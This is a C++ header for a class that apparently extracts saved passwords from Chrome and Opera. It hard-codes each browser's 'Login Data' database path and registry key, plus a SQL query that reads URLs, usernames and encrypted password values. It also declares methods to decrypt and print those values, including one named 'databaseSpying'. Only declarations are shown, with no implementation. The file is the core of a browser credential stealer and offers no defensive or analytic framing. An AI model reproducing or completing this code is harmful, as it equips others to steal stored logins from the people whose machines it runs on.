#pragma once

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "sqlite3.lib")

#include <string>

#include "ManageProcess.hh"
#include "sqlite3.h"

# define C_DBFILE	"\\Google\\Chrome\\User Data\\Default\\Login Data" 
# define C_REGKEY	"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"
# define C_PROCESS	L"chrome.exe"
# define O_DBFILE	"\\Opera Software\\Opera Stable\\Login Data" 
# define O_REGKEY	"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe"
# define O_PROCESS	L"opera.exe"
# define QUERY		"SELECT origin_url, username_value, length(password_value), password_value FROM logins"

class BrowserPassword
{
public:
	enum BrowserType
	{
		CHROME,
		OPERA
	};

	BrowserPassword();
	~BrowserPassword();

	bool		setBrowserType(const BrowserType &type);
	void        	databaseSpying();

private:
	/* Attributes */
	const char		*_dbFilePath;
	const char		*_regKeyPath;
	int			_folder;
	bool			_ready;
	const std::vector<HKEY>	_hKey;
	ManageProcess		_manageProcess;

	/* Methods */
	void		initChromeBrowser();
	void		initOperaBrowser();
	const char  	*uncryptData(BYTE *password, int size);
	void        	printPassword(sqlite3_stmt *stmt);
	void        	findPasswordTable(sqlite3 *db);
	bool        	findAppdataPath(std::string &appdataPath);
	bool        	isBrowserInstalled();
};
